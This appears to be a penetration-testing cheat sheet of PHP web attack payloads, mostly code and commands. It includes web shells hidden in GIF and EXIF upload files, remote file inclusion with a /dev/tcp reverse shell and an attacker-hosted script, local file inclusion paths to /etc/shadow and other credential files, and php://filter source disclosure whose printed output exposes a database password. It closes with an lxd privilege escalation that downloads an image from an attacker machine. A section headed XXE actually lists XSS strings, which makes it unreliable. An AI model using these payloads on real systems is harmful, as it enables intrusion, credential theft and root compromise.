
-------------------------------------------------------------------------------------------------------------
## Bypass File Upload Filtering

`GIF89a`
```
GIF89a;
<?
system($_GET['cmd']);
?>
```

`exiftool`

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg
```

------------------------------------------------------------------------------------------------------------

## Remote File Inclusion (RFI)

#### Common payloads
`php:expect://id`

`php:expect://whoami`

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.

This is how they work.

So you have an unsanitized parameter, like this
```
$incfile = $_REQUEST["file"];
include($incfile.".php");
```
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.
```
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
```
And evil.txt will look like something like this:
```
<?php echo shell_exec("whoami");?>
```
### Or just get a reverse shell directly like this:
```
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```
So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
Avoid extentions

Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.

If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.



-------------------------------------------------------------------------------------------------------------
## Local file inclusion (LFI) payloads

`../../../../../../etc/passwd`

`....//....//....//....//....//etc/passwd`

You can also try to use those insted of `/etc/passwd`
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/apache2/access.log
```

## LFI examples

*akech.com/index.php?token=`/etc/passwd%00`*

*akrech.com/index.php?page=`../../../../../../etc/passwd`*

```
http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
```
-------------------------------------------------------------------------------------------------------------
## PHP filters for LFI

```
php://filter/convert.base64-encode/resource=
```

```
php://filter/read=string.rot13/resource=
```

*example input:*

example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php

example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php

*example output:*

```
PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
```

*decode*
```
<?php
$db_name="bihtapub_db";
if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
   $con=mysql_connect("localhost","root","");
else
   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
if(!$con)...
.
.
?>

```

-------------------------------------------------------------------------------------------------------------


## XXE basic payloads

```
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
```


-------------------------------------------------------------------------------------------------------
## lxc/lxd Privilege Escalation

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
```
python -m SimpleHTTPServer
```

*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
```
cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
```

*import the lxc image*
```
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

*check the lxc image*
```
lxc image list
```

*run those commands on target machine*
```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```
